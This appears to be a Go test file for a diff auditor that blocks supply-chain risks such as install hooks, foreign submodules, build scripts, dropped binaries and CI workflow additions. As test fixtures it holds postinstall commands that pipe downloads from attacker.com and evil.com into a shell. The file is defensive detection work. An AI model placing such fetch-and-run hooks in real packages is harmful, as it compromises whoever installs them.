package gitdiff

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestSemanticDiffAuditor_PackageJSONHook(t *testing.T) {
	tmpDir := t.TempDir()
	auditor := NewSemanticDiffAuditor(tmpDir)

	pkgJSON := `{
  "name": "victim-app",
  "scripts": {
    "test": "echo test",
    "postinstall": "curl http://attacker.com/pwn | sh"
  }
}`
	filePath := filepath.Join(tmpDir, "package.json")
	if err := os.WriteFile(filePath, []byte(pkgJSON), 0644); err != nil {
		t.Fatalf("failed to write package.json: %v", err)
	}

	report, err := auditor.AuditFiles(context.Background(), tmpDir, []string{"package.json"})
	if err != nil {
		t.Fatalf("AuditFiles failed: %v", err)
	}

	if report.Allowed {
		t.Errorf("expected package.json with postinstall to be blocked, got Allowed=true")
	}

	found := false
	for _, f := range report.Findings {
		if f.Category == "Supply-Chain-Lifecycle-Hook" && f.Severity == DiffSeverityCritical {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected Supply-Chain-Lifecycle-Hook finding, got %+v", report.Findings)
	}
}

func TestSemanticDiffAuditor_GitModulesAndBuildRS(t *testing.T) {
	tmpDir := t.TempDir()
	auditor := NewSemanticDiffAuditor(tmpDir)

	gitmodules := filepath.Join(tmpDir, ".gitmodules")
	if err := os.WriteFile(gitmodules, []byte("[submodule \"lib\"]\n  path = lib\n  url = https://evil.com/repo"), 0644); err != nil {
		t.Fatalf("failed to write .gitmodules: %v", err)
	}

	buildRS := filepath.Join(tmpDir, "build.rs")
	if err := os.WriteFile(buildRS, []byte("fn main() { panic!(); }"), 0644); err != nil {
		t.Fatalf("failed to write build.rs: %v", err)
	}

	report, err := auditor.AuditFiles(context.Background(), tmpDir, []string{".gitmodules", "build.rs"})
	if err != nil {
		t.Fatalf("AuditFiles failed: %v", err)
	}

	if report.Allowed {
		t.Errorf("expected .gitmodules / build.rs to be blocked, got Allowed=true")
	}
	if len(report.Findings) < 2 {
		t.Errorf("expected at least 2 findings, got %d", len(report.Findings))
	}
}

func TestSemanticDiffAuditor_BinaryExecutableDrop(t *testing.T) {
	tmpDir := t.TempDir()
	auditor := NewSemanticDiffAuditor(tmpDir)

	// Mock ELF header: \x7fELF
	elfPath := filepath.Join(tmpDir, "backdoor.bin")
	elfBytes := []byte{0x7f, 'E', 'L', 'F', 0x02, 0x01, 0x01, 0x00}
	if err := os.WriteFile(elfPath, elfBytes, 0755); err != nil {
		t.Fatalf("failed to write ELF file: %v", err)
	}

	report, err := auditor.AuditFiles(context.Background(), tmpDir, []string{"backdoor.bin"})
	if err != nil {
		t.Fatalf("AuditFiles failed: %v", err)
	}

	if report.Allowed {
		t.Errorf("expected binary executable drop to be blocked, got Allowed=true")
	}

	binaryFound := false
	for _, f := range report.Findings {
		if f.Category == "Binary-Drop" {
			binaryFound = true
			break
		}
	}
	if !binaryFound {
		t.Errorf("expected Binary-Drop finding for ELF binary, got: %+v", report.Findings)
	}
}

func TestSemanticDiffAuditor_BenignSourceCode(t *testing.T) {
	tmpDir := t.TempDir()
	auditor := NewSemanticDiffAuditor(tmpDir)

	goFile := filepath.Join(tmpDir, "main.go")
	if err := os.WriteFile(goFile, []byte("package main\nfunc main() {}\n"), 0644); err != nil {
		t.Fatalf("failed to write main.go: %v", err)
	}

	report, err := auditor.AuditFiles(context.Background(), tmpDir, []string{"main.go"})
	if err != nil {
		t.Fatalf("AuditFiles failed: %v", err)
	}

	if !report.Allowed {
		t.Errorf("expected benign source code to be allowed, got Allowed=false")
	}
	if len(report.Findings) != 0 {
		t.Errorf("expected 0 findings for clean code, got %d", len(report.Findings))
	}
}

func TestSemanticDiffAuditor_AuditDiffStream(t *testing.T) {
	auditor := NewSemanticDiffAuditor("")

	diffText := `diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -1,3 +1,4 @@
 {
   "name": "app",
+  "postinstall": "curl http://evil.com | bash"
 }
diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
new file mode 100644
--- /dev/null
+++ b/.github/workflows/deploy.yml
@@ -0,0 +1,5 @@
+name: Deploy
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
`

	report, err := auditor.AuditDiffStream(strings.NewReader(diffText))
	if err != nil {
		t.Fatalf("AuditDiffStream failed: %v", err)
	}

	if report.Allowed {
		t.Fatalf("expected stream diff with CI and postinstall to be blocked")
	}

	if len(report.Findings) < 2 {
		t.Errorf("expected at least 2 findings, got %d", len(report.Findings))
	}
}
